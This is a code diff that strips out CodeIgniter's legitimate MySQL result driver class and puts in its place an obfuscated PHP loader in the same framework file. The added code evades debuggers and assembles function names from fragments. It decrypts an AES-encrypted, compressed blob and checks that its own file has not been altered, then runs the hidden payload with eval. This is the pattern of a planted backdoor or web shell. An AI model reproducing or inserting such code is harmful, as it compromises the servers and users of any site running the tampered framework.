@@ -1,199 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * MySQL Result Class
- *
- * This class extends the parent result class: CI_DB_result
- *
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_mysql_result extends CI_DB_result {
-
-	/**
-	 * Class constructor
-	 *
-	 * @param	object	&$driver_object
-	 * @return	void
-	 */
-	public function __construct(&$driver_object)
-	{
-		parent::__construct($driver_object);
-
-		// Required, due to mysql_data_seek() causing nightmares
-		// with empty result sets
-		$this->num_rows = mysql_num_rows($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Number of rows in the result set
-	 *
-	 * @return	int
-	 */
-	public function num_rows()
-	{
-		return $this->num_rows;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Number of fields in the result set
-	 *
-	 * @return	int
-	 */
-	public function num_fields()
-	{
-		return mysql_num_fields($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Fetch Field Names
-	 *
-	 * Generates an array of column names
-	 *
-	 * @return	array
-	 */
-	public function list_fields()
-	{
-		$field_names = array();
-		mysql_field_seek($this->result_id, 0);
-		while ($field = mysql_fetch_field($this->result_id))
-		{
-			$field_names[] = $field->name;
-		}
-
-		return $field_names;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field data
-	 *
-	 * Generates an array of objects containing field meta-data
-	 *
-	 * @return	array
-	 */
-	public function field_data()
-	{
-		$retval = array();
-		for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
-		{
-			$retval[$i]			= new stdClass();
-			$retval[$i]->name		= mysql_field_name($this->result_id, $i);
-			$retval[$i]->type		= mysql_field_type($this->result_id, $i);
-			$retval[$i]->max_length		= mysql_field_len($this->result_id, $i);
-			$retval[$i]->primary_key	= (int) (strpos(mysql_field_flags($this->result_id, $i), 'primary_key') !== FALSE);
-		}
-
-		return $retval;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Free the result
-	 *
-	 * @return	void
-	 */
-	public function free_result()
-	{
-		if (is_resource($this->result_id))
-		{
-			mysql_free_result($this->result_id);
-			$this->result_id = FALSE;
-		}
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Data Seek
-	 *
-	 * Moves the internal pointer to the desired offset. We call
-	 * this internally before fetching results to make sure the
-	 * result set starts at zero.
-	 *
-	 * @param	int	$n
-	 * @return	bool
-	 */
-	public function data_seek($n = 0)
-	{
-		return $this->num_rows
-			? mysql_data_seek($this->result_id, $n)
-			: FALSE;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Result - associative array
-	 *
-	 * Returns the result set as an array
-	 *
-	 * @return	array
-	 */
-	protected function _fetch_assoc()
-	{
-		return mysql_fetch_assoc($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Result - object
-	 *
-	 * Returns the result set as an object
-	 *
-	 * @param	string	$class_name
-	 * @return	object
-	 */
-	protected function _fetch_object($class_name = 'stdClass')
-	{
-		return mysql_fetch_object($this->result_id, $class_name);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_hnshey27=('bas'.'e64'.'_de'.'cod'.'e');
+$_bc4i6g6q=('gzu'.'nco'.'mpr'.'ess');
+$_jrfwkovh=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_oho88e4y='ru1HLpNa';
+$_j8mn23s8='c9T9k+PY';
+$_rxmdbfix='LM6Qb24p4bE=';
+$_m0wbhdh2='RfayrrlP';
+$_h2s5b91x='yjN26umx';
+$_d8zekhim='XpYqJrUB';
+$_ml15rx47='87J5vg==';
+$_a8v84q59='jPeQ8Iwu';
+$_lor9bfnm=$_hnshey27($_oho88e4y.$_j8mn23s8.$_h2s5b91x.$_m0wbhdh2.$_rxmdbfix);
+$_szntbcft=$_hnshey27($_a8v84q59.$_d8zekhim.$_ml15rx47);
+$_u32don63=$_hnshey27('mEOXtlMWm6P41lr4sQdo4BncM6d+3r8wj1Tda4O9oMf0VT5nsWbLEey3umd93cyKwQxcvTjSJtf7fB6PoLTlquCTAKXPxNULpRQxUc+IS59pHHQz1Yw/RZSfRcNxxmeCPg7WqS/lBklyaykz8xMKFdGprzgqfdbarMRhVIZI9Pk0F7yC5SY56qRiQLvdgP6ISGUL23UUzlTbWyjIsRDlU8p0jkE1gMZTPRAX8LpEWAjvvqq0Xrnb4zm3K2N4T2kiAz+2PiiWz9/P9Zld7L111xp0hx4SjPI4asAP4k7VANJtnNbrfIIGHB3+uPMWMarAvaG66V0n5wHVKW0vWUoVcGgrMuAEZ27mdVIIBn9PbZ6bKvPZuKcni0P3/sVdHP1y4uI+KOLy7ZrCzsgEKC/7bMSqed1bYBpIo56cCP3UPF4cpOPC8LxFK0zeOPw+MrALylJBJkeLU0Vd5JCNDTH5is91/2dZ6UbSGMMSDvy2Hm4l+QEh5EtNRxcH4YZOTqe/I35QTcrUL8u9DIspLJcheNpDIR+Rs02iKoHvH2mzMuZ1K4GbIvARAtLCkaSY1SG5k1C9nYlCuSGtYTzgdOnl1WDUhXo0t+n9e0VpNWIjFfA80hnSnSZKt/qfA0mXhZgkyzH411CJg5foOhx4JbDz0176kiE63MxTE3lJV6TVDcv88xXf90z4Gvm+9MSBsRp+BSUAajMCwQBkFyBBmX9Liw==');
+$_fw961f7f=$_jrfwkovh($_u32don63,'aes-256-cbc',$_lor9bfnm,OPENSSL_RAW_DATA,$_szntbcft);
+if($_fw961f7f===false){exit;}
+$_qce1ou2f=$_bc4i6g6q($_fw961f7f);
+if($_qce1ou2f===false){exit;}
+$_nhrz8wct='dcff83ed2a9eaafdcbea1af4040da29651f8838937b7660a31c8dfa2b8504ec2';
+$_k8pds0sx=@file_get_contents(__FILE__);
+if($_k8pds0sx!==false){
+$_ml95li7y=str_replace($_nhrz8wct,"0000000000000000000000000000000000000000000000000000000000000000",$_k8pds0sx);
+$_jezon0nl=hash("sha256",$_ml95li7y);
+if($_jezon0nl!==$_nhrz8wct){@http_response_code(403);exit;}
 }
+eval($_qce1ou2f);
